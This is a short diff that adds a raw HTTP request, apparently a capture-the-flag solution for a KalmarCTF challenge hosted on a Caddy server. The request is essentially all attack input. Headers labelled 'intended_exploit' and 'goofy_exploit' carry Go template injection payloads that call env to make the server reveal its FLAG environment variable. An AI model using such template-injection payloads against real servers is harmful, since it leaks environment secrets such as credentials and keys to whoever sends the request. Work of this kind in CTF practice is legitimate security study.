@@ -1,0 +1,9 @@
+GET /fetch/headers HTTP/1.1
+Host: private.caddy.chal-kalmarc.tf
+User-Agent: Mozilla/5.0 
+Accept: */*
+Connection: close
+intended_exploit: {{ env `FLAG`}}
+goofy_exploit: {{ .Req.Header.Flag | toString  | substr 1 5 | env}}
+Flag: FLAG
+
